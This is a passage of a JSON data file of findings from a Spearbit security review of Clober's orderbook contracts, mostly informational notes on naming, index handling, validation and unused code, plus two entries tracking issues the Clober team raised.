"https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "For ease of 3rd party integration, consider renaming to flash(), as it would then have the same function sig as Uniswap V3, although the callback function would still be different.", "labels": ["Spearbit", "Clober", "Severity: Informational"]}, {"title": "Unsupported tokens: tokens with more than 18 decimals", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The orderbook does currently not support tokens with more than 18 decimals. However, having more than 18 decimals is very unusual.", "labels": ["Spearbit", "Clober", "Severity: Informational"]}, {"title": "ArithmeticPriceBook and GeometricPriceBook contracts should be abstract", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The ArithmeticPriceBook and GeometricPriceBook contracts don't have any external functions.", "labels": ["Spearbit", "Clober", "Severity: Informational"]}, {"title": "childRawIndex in OctopusHeap.pop is not a raw index", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The OctopusHeap uses raw and heap indices. Raw indices are 0-based (root has raw index 0) and iterate the tree top to bottom, left to right. Heap indices are 1-based (root has heap index 0) and iterate the head left to right, top to bottom, but then iterate the remaining nodes octopus arm by arm. A mapping between the raw index and heap index can be obtained through _convertRawIndexToHeapIndex. The pop function defines a childRawIndex but this variable is not a raw index, it's actually raw index + 1 (1-based). 30", "labels": ["Spearbit", "Clober", "Severity: Informational"]}, {"title": "Lack of orderIndex validation", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The orderIndex parameter in the OrderNFT contract is missing proper validation. Realistically the value should never exceed type(uint232).max as it is passed from the OrderBook contract, however, future changes to the code might potentially cause encoding/decoding ambiguity.", "labels": ["Spearbit", "Clober", "Severity: Informational"]}, {"title": "Unsafe _getParentHeapIndex, _getLeftChildHeapIndex", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "When heapIndex = 1 _getParentHeapIndex(uint16 heapIndex) would return 0 which is an invalid heap index. when heapIndex = 45 _getLeftChildHeapIndex(uint16 heapIndex) would return 62 which is an invalid heap index.", "labels": ["Spearbit", "Clober", "Severity: Informational"]}, {"title": "_priceToIndex function implemented but unused", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The _priceToIndex function for the price books are implemented but unused.", "labels": ["Spearbit", "Clober", "Severity: Informational"]}, {"title": "Incorrect _MAX_NODES and _MAX_NODES_P descriptions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "The derivation of the values _MAX_NODES and MAX_NODES_P in the comments are incorrect. For _MAX_NODES C * ((S *C) ** L-1)) = 4 * ((2 * 4) ** 3) = 2048 is missing the E, or replace S * C with N. The issue isn't entirely resolved though, as it becomes C * (S * C * E) ** (L - 1) = 4 * (2 * 4 * 2) ** 3 = 16384 or 2 ** 14 Same with _MAX_NODES_P", "labels": ["Spearbit", "Clober", "Severity: Informational"]}, {"title": "marketOrder() with expendOutput reverts with SlippageError with max tolerance", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "During the audit the Clober team raised this issue. Added here to track the fixes.", "labels": ["Spearbit", "Clober", "Severity: High Risk"]}, {"title": "Wrong OrderIndex could be emitted at Claim() event.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Clober-Spearbit-Security-Review.pdf", "body": "During the audit the Clober team raised this issue. Added here to track the fixes.", "labels": ["Spearbit", "Clober", "Severity: Low Risk"]}]